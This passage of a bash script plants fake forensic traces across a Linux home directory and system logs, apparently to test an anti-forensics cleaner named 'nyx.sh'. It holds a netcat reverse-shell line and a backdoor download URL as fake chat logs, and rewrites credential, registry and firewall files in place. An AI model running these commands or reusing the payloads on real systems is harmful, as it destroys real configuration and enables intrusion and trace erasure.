    cd ~
    
    # SVN artifacts
    mkdir -p ~/.subversion/auth/svn.simple
    echo "Stored SVN credentials" > ~/.subversion/auth/svn.simple/abc123def456
    
    # Mercurial artifacts
    echo "[ui]" > ~/.hgrc
    echo "username = Evil Developer <evil@malicious.com>" >> ~/.hgrc
    
    # Maven artifacts
    mkdir -p ~/.m2
    echo "<settings>" > ~/.m2/settings.xml
    echo "  <servers>" >> ~/.m2/settings.xml
    echo "    <server>" >> ~/.m2/settings.xml
    echo "      <id>evil-repo</id>" >> ~/.m2/settings.xml
    echo "      <username>admin</username>" >> ~/.m2/settings.xml
    echo "      <password>password123</password>" >> ~/.m2/settings.xml
    echo "    </server>" >> ~/.m2/settings.xml
    echo "  </servers>" >> ~/.m2/settings.xml
    echo "</settings>" >> ~/.m2/settings.xml
    
    # Gradle artifacts
    mkdir -p ~/.gradle
    echo "systemProp.http.proxyHost=evil-proxy.com" > ~/.gradle/gradle.properties
    echo "systemProp.http.proxyPort=8080" >> ~/.gradle/gradle.properties
    
    # npm artifacts
    echo "//registry.evil.com/:_authToken=SECRET_TOKEN" > ~/.npmrc
    echo "registry=https://registry.evil.com/" >> ~/.npmrc
    
    # pip artifacts
    mkdir -p ~/.config/pip
    echo "[global]" > ~/.config/pip/pip.conf
    echo "index-url = https://pypi.evil.com/simple" >> ~/.config/pip/pip.conf
    echo "trusted-host = pypi.evil.com" >> ~/.config/pip/pip.conf
    
    # Cargo artifacts
    mkdir -p ~/.cargo
    echo "[source.crates-io]" > ~/.cargo/config
    echo "replace-with = \"evil-registry\"" >> ~/.cargo/config
    echo "[source.evil-registry]" >> ~/.cargo/config
    echo "registry = \"https://evil-registry.com/index\"" >> ~/.cargo/config
    
    echo "[✓] Development tool artifacts created"
    
    echo "[*] Creating cloud service artifacts..."
    
    # AWS CLI artifacts
    mkdir -p ~/.aws
    echo "[default]" > ~/.aws/credentials
    echo "aws_access_key_id = AKIAIOSFODNN7EXAMPLE" >> ~/.aws/credentials
    echo "aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" >> ~/.aws/credentials
    
    echo "[default]" > ~/.aws/config
    echo "region = us-east-1" >> ~/.aws/config
    echo "output = json" >> ~/.aws/config
    
    # Google Cloud artifacts
    mkdir -p ~/.config/gcloud
    echo '{"client_id":"evil-app.apps.googleusercontent.com","client_secret":"EVIL_SECRET"}' > ~/.config/gcloud/application_default_credentials.json
    
    # Azure CLI artifacts
    mkdir -p ~/.azure
    echo '{"subscriptions":[{"id":"12345678-1234-1234-1234-123456789012","name":"Evil Subscription"}]}' > ~/.azure/azureProfile.json
    
    # Kubernetes artifacts
    mkdir -p ~/.kube
    echo "apiVersion: v1" > ~/.kube/config
    echo "clusters:" >> ~/.kube/config
    echo "- cluster:" >> ~/.kube/config
    echo "    server: https://evil-k8s-cluster.com:6443" >> ~/.kube/config
    echo "  name: evil-cluster" >> ~/.kube/config
    
    # Terraform artifacts
    mkdir -p ~/.terraform.d
    echo '{"credentials":{"app.terraform.io":{"token":"EVIL_TOKEN"}}}' > ~/.terraform.d/credentials.tfrc.json
    
    echo "[✓] Cloud service artifacts created"
    
    echo "[*] Creating monitoring/logging artifacts..."
    
    # Elasticsearch artifacts
    sudo bash -c '
        mkdir -p /var/log/elasticsearch
        echo "[$(date)] [WARN ][o.e.x.s.a.AuthenticationService] [node-1] Authentication failed for user [elastic] from [10.0.0.1]" >> /var/log/elasticsearch/elasticsearch.log
        echo "[$(date)] [INFO ][o.e.c.m.MetaDataDeleteIndexService] [node-1] [sensitive_data/abc123] deleting index" >> /var/log/elasticsearch/elasticsearch.log
    '
    
    # Logstash artifacts
    sudo bash -c '
        mkdir -p /var/log/logstash
        echo "[$(date)] [ERROR][logstash.agent] Failed to execute action {:action=>LogStash::PipelineAction::Create/pipeline_id:main" >> /var/log/logstash/logstash-plain.log
    '
    
    # Kibana artifacts
    sudo bash -c '
        mkdir -p /var/log/kibana
        echo '{"type":"response","@timestamp":"$(date)","tags":[],"pid":1234,"method":"post","statusCode":401,"req":{"url":"/api/security/v1/login","method":"post","headers":{"host":"10.0.0.1:5601"},"remoteAddress":"10.0.0.1"}}' >> /var/log/kibana/kibana.log
    '
    
    # Prometheus artifacts
    mkdir -p ~/.config/prometheus
    echo "global:" > ~/.config/prometheus/prometheus.yml
    echo "  external_labels:" >> ~/.config/prometheus/prometheus.yml
    echo "    monitor: 'evil-monitor'" >> ~/.config/prometheus/prometheus.yml
    echo "scrape_configs:" >> ~/.config/prometheus/prometheus.yml
    echo "  - job_name: 'evil-targets'" >> ~/.config/prometheus/prometheus.yml
    echo "    static_configs:" >> ~/.config/prometheus/prometheus.yml
    echo "      - targets: ['10.0.0.1:9090']" >> ~/.config/prometheus/prometheus.yml
    
    # Grafana artifacts
    mkdir -p ~/.config/grafana
    echo "[security]" > ~/.config/grafana/grafana.ini
    echo "admin_user = admin" >> ~/.config/grafana/grafana.ini
    echo "admin_password = password123" >> ~/.config/grafana/grafana.ini
    
    echo "[✓] Monitoring/logging artifacts created"
    
    echo "[*] Creating backup tool artifacts..."
    
    # Rsync artifacts
    echo "rsync://evil-backup-server.com/backups/" > ~/.rsync_history
    echo "--password-file=/tmp/rsync.password" >> ~/.rsync_history
    
    # Restic artifacts
    mkdir -p ~/.config/restic
    echo "RESTIC_REPOSITORY=sftp:user@evil-backup.com:/backups" > ~/.config/restic/repo
    echo "RESTIC_PASSWORD=SecretBackupPassword123" >> ~/.config/restic/repo
    
    # Borg backup artifacts
    mkdir -p ~/.config/borg
    echo "export BORG_REPO='ssh://user@evil-backup.com/./backups'" > ~/.config/borg/config
    echo "export BORG_PASSPHRASE='SecretBorgPassword123'" >> ~/.config/borg/config
    
    # Duplicity artifacts
    echo "FTP_PASSWORD=password123" > ~/.duplicity_credentials
    echo "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE" >> ~/.duplicity_credentials
    echo "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" >> ~/.duplicity_credentials
    
    echo "[✓] Backup tool artifacts created"
    
    echo "[*] Creating security tool artifacts..."
    
    # Metasploit artifacts
    mkdir -p ~/.msf4
    echo "db_connect postgresql://msf:password123@localhost/msf" > ~/.msf4/history
    echo "use exploit/multi/handler" >> ~/.msf4/history
    echo "set LHOST 10.0.0.1" >> ~/.msf4/history
    echo "set LPORT 4444" >> ~/.msf4/history
    echo "exploit" >> ~/.msf4/history
    
    # Nmap artifacts
    mkdir -p ~/.nmap
    echo "# Nmap done at $(date) -- 256 IP addresses (256 hosts up) scanned" > ~/.nmap/scan-results.xml
    echo "<nmaprun scanner=\"nmap\" args=\"-sS -p- 192.168.1.0/24\">" >> ~/.nmap/scan-results.xml
    
    # Aircrack-ng artifacts
    mkdir -p ~/.aircrack-ng
    echo "BSSID: AA:BB:CC:DD:EE:FF" > ~/.aircrack-ng/captured-handshakes.txt
    echo "ESSID: EvilAP" >> ~/.aircrack-ng/captured-handshakes.txt
    echo "Key: password123" >> ~/.aircrack-ng/captured-handshakes.txt
    
    # John the Ripper artifacts
    mkdir -p ~/.john
    echo "admin:$1$12345678$HASH_CRACKED_PASSWORD" > ~/.john/john.pot
    echo "root:$6$rounds=5000$HASH_ANOTHER_PASSWORD" >> ~/.john/john.pot
    
    # Hashcat artifacts
    mkdir -p ~/.hashcat
    echo "5f4dcc3b5aa765d61d8327deb882cf99:password" > ~/.hashcat/hashcat.potfile
    echo "e10adc3949ba59abbe56e057f20f883e:123456" >> ~/.hashcat/hashcat.potfile
    
    echo "[✓] Security tool artifacts created"
    
    echo "[*] Creating messaging/chat artifacts..."
    
    # IRC artifacts
    mkdir -p ~/.irssi
    echo "[(status)] /connect irc.evil-server.com" > ~/.irssi/away.log
    echo "[(status)] /join #evil-channel" >> ~/.irssi/away.log
    echo "[(status)] /msg botmaster !shell nc -e /bin/bash 10.0.0.1 4444" >> ~/.irssi/away.log
    
    # Weechat artifacts
    mkdir -p ~/.weechat
    echo "[$(date)] irc: connected to evil-irc.com (10.0.0.1)" > ~/.weechat/weechat.log
    echo "[$(date)] irc: #hackers: <evil_user> payload uploaded to http://evil.com/backdoor.sh" >> ~/.weechat/weechat.log
    
    # Pidgin artifacts
    mkdir -p ~/.purple/logs/jabber/user@domain.com/attacker@evil.com
    echo "<message time='$(date +%s)' from='attacker@evil.com'>Check out this malware: http://evil.com/payload.exe</message>" > ~/.purple/logs/jabber/user@domain.com/attacker@evil.com/conversation.xml
    
    # Discord artifacts (if using CLI client)
    mkdir -p ~/.config/discord
    echo '{"token":"MTIzNDU2Nzg5MDEyMzQ1Njc4.Abc123.EVIL_DISCORD_TOKEN"}' > ~/.config/discord/settings.json
    
    # Slack artifacts
    mkdir -p ~/.config/slack-term
    echo '{"api_token":"xoxp-123456789012-123456789012-123456789012-abcdef1234567890abcdef1234567890"}' > ~/.config/slack-term/config
    
    echo "[✓] Messaging/chat artifacts created"
    
    echo "[*] Creating virtualization artifacts..."
    
    # VMware artifacts
    mkdir -p ~/.vmware
    echo "[VMware]" > ~/.vmware/preferences
    echo "pref.motd.seen = \"TRUE\"" >> ~/.vmware/preferences
    echo "pref.lastUpdateCheck = \"1234567890\"" >> ~/.vmware/preferences
    echo "pref.keyboardAndMouse.vmHotKey.enabled = \"FALSE\"" >> ~/.vmware/preferences
    
    mkdir -p ~/.vmware/logs
    echo "$(date) VMware Player started" > ~/.vmware/logs/player.log
    echo "$(date) Connected to VM: evil-vm" >> ~/.vmware/logs/player.log
    
    # VirtualBox artifacts
    mkdir -p ~/.config/VirtualBox
    echo "<?xml version=\"1.0\"?>" > ~/.config/VirtualBox/VirtualBox.xml
    echo "<VirtualBox xmlns=\"http://www.virtualbox.org/\" version=\"1.29\">" >> ~/.config/VirtualBox/VirtualBox.xml
    echo "  <Machine uuid=\"{12345678-1234-1234-1234-123456789012}\" name=\"evil-vm\" OSType=\"Linux_64\" />" >> ~/.config/VirtualBox/VirtualBox.xml
    echo "</VirtualBox>" >> ~/.config/VirtualBox/VirtualBox.xml
    
    mkdir -p ~/.config/VirtualBox/Logs
    echo "VirtualBox VM Log" > ~/.config/VirtualBox/Logs/VBox.log
    
    # QEMU artifacts
    mkdir -p ~/.config/qemu
    echo "# QEMU config" > ~/.config/qemu/qemu.conf
    echo "network \"default\"" >> ~/.config/qemu/qemu.conf
    
    # Vagrant artifacts
    mkdir -p ~/.vagrant.d/data/machine-index
    echo '{"active_machines":{}}' > ~/.vagrant.d/data/machine-index/index
    
    echo "[✓] Virtualization artifacts created"
    
    echo "[*] Creating network analysis artifacts..."
    
    # Wireshark artifacts
    mkdir -p ~/.config/wireshark
    echo "# Recent capture files" > ~/.config/wireshark/recent
    echo "recent.capture_file: /tmp/evil-capture.pcap" >> ~/.config/wireshark/recent
    echo "recent.capture_file: /home/testuser/suspicious-traffic.pcap" >> ~/.config/wireshark/recent
    
    echo "# Recent display filters" > ~/.config/wireshark/recent_common
    echo "recent.display_expression.0: tcp.port == 4444" >> ~/.config/wireshark/recent_common
    echo "recent.display_expression.1: ip.addr == 10.0.0.1" >> ~/.config/wireshark/recent_common
    
    # tcpdump artifacts
    echo "tcpdump -i eth0 -w /tmp/capture.pcap" > ~/.tcpdump_history
    echo "tcpdump -n host 10.0.0.1" >> ~/.tcpdump_history
    
    # Network analysis tools
    mkdir -p ~/.config/ettercap
    echo "# Ettercap config" > ~/.config/ettercap/etter.conf
    echo "[mitm]" >> ~/.config/ettercap/etter.conf
    echo "remote_browser = \"firefox -remote openurl(http://%host%url)\"" >> ~/.config/ettercap/etter.conf
    
    # iptables rules backup
    sudo bash -c '
        mkdir -p /etc/iptables
        echo "# Generated by iptables-save v1.8.4 on $(date)" > /etc/iptables/rules.v4
        echo "*filter" >> /etc/iptables/rules.v4
        echo ":INPUT ACCEPT [0:0]" >> /etc/iptables/rules.v4
        echo ":FORWARD ACCEPT [0:0]" >> /etc/iptables/rules.v4
        echo ":OUTPUT ACCEPT [0:0]" >> /etc/iptables/rules.v4
        echo "-A INPUT -s 10.0.0.1/32 -j DROP" >> /etc/iptables/rules.v4
        echo "-A OUTPUT -d 10.0.0.1/32 -j DROP" >> /etc/iptables/rules.v4
        echo "COMMIT" >> /etc/iptables/rules.v4
    '
    
    echo "[✓] Network analysis artifacts created"
    
    echo "[*] Creating forensic analysis artifacts..."
    
    # Autopsy artifacts
    mkdir -p ~/.autopsy
    echo "# Autopsy config" > ~/.autopsy/config.xml
    echo "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" >> ~/.autopsy/config.xml
    echo "<config>" >> ~/.autopsy/config.xml
    echo "  <recent_cases>" >> ~/.autopsy/config.xml
    echo "    <case>/home/testuser/evil-case.aut</case>" >> ~/.autopsy/config.xml
    echo "  </recent_cases>" >> ~/.autopsy/config.xml
    echo "</config>" >> ~/.autopsy/config.xml
    
    # Volatility artifacts
    mkdir -p ~/.volatility
    echo "[DEFAULT]" > ~/.volatilityrc
    echo "profile = Win7SP1x64" >> ~/.volatilityrc
    echo "location = file:///tmp/evil-memory.raw" >> ~/.volatilityrc
    
    # Sleuth Kit artifacts
    echo "mmls /dev/sda" > ~/.tsk_history
    echo "fls -r -o 2048 /dev/sda" >> ~/.tsk_history
    echo "icat -o 2048 /dev/sda 12345 > recovered_file.txt" >> ~/.tsk_history
    
    # Foremost artifacts
    mkdir -p ~/.foremost
    echo "# Foremost config" > ~/.foremost/foremost.conf
    echo "jpg  y   20000000  \\xff\\xd8\\xff\\xe0  \\xff\\xd9" >> ~/.foremost/foremost.conf
    
    echo "[✓] Forensic analysis artifacts created"
    
    echo "[*] Creating remote access artifacts..."
    
    # RDP artifacts
    mkdir -p ~/.config/freerdp
    echo "[connection]" > ~/.config/freerdp/known_hosts
    echo "evil-server.com = AA:BB:CC:DD:EE:FF:11:22:33:44:55:66:77:88:99:00" >> ~/.config/freerdp/known_hosts
    
    mkdir -p ~/.local/share/remmina
    echo "[remmina]" > ~/.local/share/remmina/remmina.pref
    echo "secret = aWFtZXZpbA==" >> ~/.local/share/remmina/remmina.pref
    echo "datadir_path = /home/testuser/.local/share/remmina" >> ~/.local/share/remmina/remmina.pref
    
    # VNC artifacts
    mkdir -p ~/.vnc
    echo "# VNC password file" > ~/.vnc/passwd
    echo "ENCRYPTED_VNC_PASSWORD" >> ~/.vnc/passwd
    echo "evil-server.com:0" > ~/.vnc/config
    echo "10.0.0.1:5900" >> ~/.vnc/config
    
    # TeamViewer artifacts
    mkdir -p ~/.config/teamviewer
    echo "[TeamViewer]" > ~/.config/teamviewer/client.conf
    echo "LastConnection = evil-server.com" >> ~/.config/teamviewer/client.conf
    echo "SecurityToken = EVIL_SECURITY_TOKEN" >> ~/.config/teamviewer/client.conf
    
    # AnyDesk artifacts
    mkdir -p ~/.anydesk
    echo "ad.trace.level=4" > ~/.anydesk/user.conf
    echo "ad.roster.items=evil-server@ad" >> ~/.anydesk/user.conf
    
    echo "[✓] Remote access artifacts created"
    
    echo "[*] Creating system monitoring artifacts..."
    
    # htop artifacts
    mkdir -p ~/.config/htop
    echo "# htop config" > ~/.config/htop/htoprc
    echo "fields=0 48 46 47 49 1" >> ~/.config/htop/htoprc
    echo "sort_key=46" >> ~/.config/htop/htoprc
    echo "highlight_base_name=1" >> ~/.config/htop/htoprc
    echo "highlight_changes=1" >> ~/.config/htop/htoprc
    echo "highlight_deleted_exe=1" >> ~/.config/htop/htoprc
    
    # System monitoring logs
    sudo bash -c '
        mkdir -p /var/log/sysstat
        echo "$(date) CPU: 100% - suspicious process consuming resources" > /var/log/sysstat/sa01
        echo "$(date) Memory: 95% used - potential memory leak detected" >> /var/log/sysstat/sa01
        
        # sar data files
        echo "System activity data" > /var/log/sysstat/sa$(date +%d)
    '
    
    # Nagios artifacts
    mkdir -p ~/.nagios
    echo "# Nagios config" > ~/.nagios/nagios.cfg
    echo "log_file=/var/log/nagios/nagios.log" >> ~/.nagios/nagios.cfg
    echo "admin_email=admin@evil.com" >> ~/.nagios/nagios.cfg
    
    # Zabbix artifacts
    mkdir -p ~/.zabbix
    echo "Server=evil-monitor.com" > ~/.zabbix/zabbix_agentd.conf
    echo "ServerActive=10.0.0.1:10051" >> ~/.zabbix/zabbix_agentd.conf
    echo "Hostname=compromised-host" >> ~/.zabbix/zabbix_agentd.conf
    
    echo "[✓] System monitoring artifacts created"
    
    echo "[*] Creating game/entertainment artifacts..."
    
    # Steam artifacts
    mkdir -p ~/.local/share/Steam/config
    echo "# Steam login history" > ~/.local/share/Steam/config/loginusers.vdf
    echo "\"users\"" >> ~/.local/share/Steam/config/loginusers.vdf
    echo "{" >> ~/.local/share/Steam/config/loginusers.vdf
    echo "    \"76561198000000000\"" >> ~/.local/share/Steam/config/loginusers.vdf
    echo "    {" >> ~/.local/share/Steam/config/loginusers.vdf
    echo "        \"AccountName\"    \"evil_gamer\"" >> ~/.local/share/Steam/config/loginusers.vdf
    echo "    }" >> ~/.local/share/Steam/config/loginusers.vdf
    echo "}" >> ~/.local/share/Steam/config/loginusers.vdf
    
    # Minecraft artifacts
    mkdir -p ~/.minecraft
    echo "# Minecraft launcher profiles" > ~/.minecraft/launcher_profiles.json
    echo '{"profiles":{"evil":{"name":"Evil Player","lastUsed":"2024-01-01T12:00:00.000Z"}}}' >> ~/.minecraft/launcher_profiles.json
    
    # Discord gaming
    mkdir -p ~/.config/discord/Local\ Storage/leveldb
    echo "Discord leveldb data" > ~/.config/discord/Local\ Storage/leveldb/000001.log
    
    echo "[✓] Game/entertainment artifacts created"
    
    echo "[*] Creating file sharing artifacts..."
    
    # Transmission (BitTorrent)
    mkdir -p ~/.config/transmission
    echo "{" > ~/.config/transmission/settings.json
    echo "    \"download-dir\": \"/home/testuser/Downloads\"," >> ~/.config/transmission/settings.json
    echo "    \"incomplete-dir\": \"/home/testuser/Downloads/.incomplete\"," >> ~/.config/transmission/settings.json
    echo "    \"peer-id-ttl-hours\": 6," >> ~/.config/transmission/settings.json
    echo "    \"peer-port\": 51413," >> ~/.config/transmission/settings.json
    echo "    \"recent-download-dir-1\": \"/tmp/evil-downloads\"" >> ~/.config/transmission/settings.json
    echo "}" >> ~/.config/transmission/settings.json
    
    # qBittorrent artifacts
    mkdir -p ~/.config/qBittorrent
    echo "[Preferences]" > ~/.config/qBittorrent/qBittorrent.ini
    echo "Downloads\SavePath=/home/testuser/Downloads" >> ~/.config/qBittorrent/qBittorrent.ini
    echo "WebUI\Username=admin" >> ~/.config/qBittorrent/qBittorrent.ini
    echo "WebUI\Password_ha1=EVIL_PASSWORD_HASH" >> ~/.config/qBittorrent/qBittorrent.ini
    
    # Deluge artifacts
    mkdir -p ~/.config/deluge
    echo "{" > ~/.config/deluge/core.conf
    echo "    \"download_location\": \"/home/testuser/Downloads\"," >> ~/.config/deluge/core.conf
    echo "    \"move_completed_path\": \"/home/testuser/Completed\"," >> ~/.config/deluge/core.conf
    echo "    \"listen_ports\": [6881, 6891]" >> ~/.config/deluge/core.conf
    echo "}" >> ~/.config/deluge/core.conf
    
    # aMule artifacts
    mkdir -p ~/.aMule
    echo "# aMule config" > ~/.aMule/amule.conf
    echo "[eMule]" >> ~/.aMule/amule.conf
    echo "Nick=evil_downloader" >> ~/.aMule/amule.conf
    echo "IncomingDir=/home/testuser/aMule/Incoming" >> ~/.aMule/amule.conf
    
    echo "[✓] File sharing artifacts created"
    
    echo "[*] Creating multimedia artifacts..."
    
    # VLC artifacts
    mkdir -p ~/.config/vlc
    echo "# VLC media library" > ~/.config/vlc/vlc-qt-interface.conf
    echo "[RecentsMRL]" >> ~/.config/vlc/vlc-qt-interface.conf
    echo "list=file:///tmp/suspicious-video.mp4, file:///home/testuser/evil-recording.avi" >> ~/.config/vlc/vlc-qt-interface.conf
    
    # Audacity artifacts
    mkdir -p ~/.audacity-data
    echo "RecentFiles=0" > ~/.audacity-data/audacity.cfg
    echo "RecentFiles0=/tmp/recorded-conversation.wav" >> ~/.audacity-data/audacity.cfg
    echo "RecentFiles1=/home/testuser/suspicious-audio.mp3" >> ~/.audacity-data/audacity.cfg
    
    # GIMP artifacts
    mkdir -p ~/.config/GIMP/2.10
    echo "# GIMP sessionrc" > ~/.config/GIMP/2.10/sessionrc
    echo "(session-info \"toplevel\"" >> ~/.config/GIMP/2.10/sessionrc
    echo "    (last-tip-shown 0)" >> ~/.config/GIMP/2.10/sessionrc
    echo ")" >> ~/.config/GIMP/2.10/sessionrc
    
    echo "# Recent documents" > ~/.config/GIMP/2.10/recentrc
    echo '(document "/tmp/evil-image.png")' >> ~/.config/GIMP/2.10/recentrc
    echo '(document "/home/testuser/suspicious-photo.jpg")' >> ~/.config/GIMP/2.10/recentrc
    
    # OBS Studio artifacts
    mkdir -p ~/.config/obs-studio
    echo "{" > ~/.config/obs-studio/global.ini
    echo "    \"recordingPath\": \"/home/testuser/Videos\"," >> ~/.config/obs-studio/global.ini
    echo "    \"lastRecording\": \"/tmp/screen-recording.mkv\"" >> ~/.config/obs-studio/global.ini
    echo "}" >> ~/.config/obs-studio/global.ini
    
    echo "[✓] Multimedia artifacts created"
    
    echo "[*] Creating productivity tool artifacts..."
    
    # LibreOffice artifacts
    mkdir -p ~/.config/libreoffice/4/user
    echo "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" > ~/.config/libreoffice/4/user/registrymodifications.xcu
    echo "<oor:items xmlns:oor=\"http://openoffice.org/2001/registry\">" >> ~/.config/libreoffice/4/user/registrymodifications.xcu
    echo "  <item oor:path=\"/org.openoffice.Office.Common/History\">" >> ~/.config/libreoffice/4/user/registrymodifications.xcu
    echo "    <prop oor:name=\"PickList\">" >> ~/.config/libreoffice/4/user/registrymodifications.xcu
    echo "      <value>file:///tmp/confidential.odt</value>" >> ~/.config/libreoffice/4/user/registrymodifications.xcu
    echo "    </prop>" >> ~/.config/libreoffice/4/user/registrymodifications.xcu
    echo "  </item>" >> ~/.config/libreoffice/4/user/registrymodifications.xcu
    echo "</oor:items>" >> ~/.config/libreoffice/4/user/registrymodifications.xcu
    
    # Thunderbird artifacts
    mkdir -p ~/.thunderbird/profile.default
    echo "# Thunderbird prefs" > ~/.thunderbird/profile.default/prefs.js
    echo "user_pref(\"mail.identity.id1.useremail\", \"user@evil.com\");" >> ~/.thunderbird/profile.default/prefs.js
    echo "user_pref(\"mail.server.server1.hostname\", \"mail.evil.com\");" >> ~/.thunderbird/profile.default/prefs.js
    
    # Evolution mail artifacts
    mkdir -p ~/.config/evolution/sources
    echo "# Evolution sources" > ~/.config/evolution/sources/sources.db
    echo "evil-mail-server.com" >> ~/.config/evolution/sources/sources.db
    
    # KeePass artifacts
    mkdir -p ~/.config/KeePass
    echo "<?xml version=\"1.0\" encoding=\"utf-8\"?>" > ~/.config/KeePass/KeePass.config.xml
    echo "<Configuration>" >> ~/.config/KeePass/KeePass.config.xml
    echo "  <Application>" >> ~/.config/KeePass/KeePass.config.xml
    echo "    <LastUsedFile>" >> ~/.config/KeePass/KeePass.config.xml
    echo "      <Path>/home/testuser/passwords.kdbx</Path>" >> ~/.config/KeePass/KeePass.config.xml
    echo "    </LastUsedFile>" >> ~/.config/KeePass/KeePass.config.xml
    echo "  </Application>" >> ~/.config/KeePass/KeePass.config.xml
    echo "</Configuration>" >> ~/.config/KeePass/KeePass.config.xml
    
    echo "[✓] Productivity tool artifacts created"
}

# Count artifacts before creation
count_artifacts() {
    local count=0
    
    # Count history files with content
    for file in ~/.bash_history ~/.zsh_history ~/.python_history ~/.mysql_history ~/.sqlite_history ~/.viminfo ~/.lesshst ~/.wget-hsts; do
        if [ -s "$file" ]; then
            count=$((count + 1))
        fi
    done
    
    # Count system logs with content (need sudo)
    sudo bash -c '
        for log in /var/log/auth.log /var/log/syslog /var/log/kern.log /var/log/apache2/access.log /var/log/apache2/error.log /var/log/nginx/access.log /var/log/audit/audit.log /var/log/wtmp /var/log/btmp /var/log/lastlog; do
            if [ -s "$log" ] 2>/dev/null; then
                count=$((count + 1))
            fi
        done
        echo $count
    ' | read sys_count 2>/dev/null || sys_count=0
    
    count=$((count + sys_count))
    echo $count
}

# Main execution
echo "[*] Initial artifact count: $(count_artifacts)"
echo ""

create_artifacts

echo ""
echo "[*] Final artifact count: $(count_artifacts)"
echo ""
echo "================================"
echo "Artifact Creation Complete!"
echo "================================"
echo ""
echo "Artifacts created in:"
echo "  - Shell histories: ~/.bash_history, ~/.zsh_history, etc."
echo "  - System logs: /var/log/auth.log, /var/log/syslog, etc."
echo "  - Audit logs: /var/log/audit/audit.log"
echo "  - Web server logs: /var/log/apache2/*, /var/log/nginx/*"
echo ""
echo "Run 'nyx.sh' to clean these artifacts"
